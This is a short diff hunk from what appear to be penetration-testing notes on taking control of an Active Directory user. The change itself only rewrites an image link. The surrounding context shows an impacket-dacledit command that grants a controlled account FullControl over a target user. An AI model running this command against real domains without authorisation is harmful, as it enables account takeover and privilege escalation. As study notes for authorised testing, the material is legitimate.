@@ -20,4 +20,4 @@ if you’re gaining control over a user
     
     - impacket-dacledit -action 'write' -rights 'FullControl' -principal '<controlled_user>' -target '<target_user>' '<domain>'/'<controlled_user>':'<pass>’
     
-![[/image 5 175.png|image 5 175.png]]
+![image 5 175.png](/image%205%20175.png)
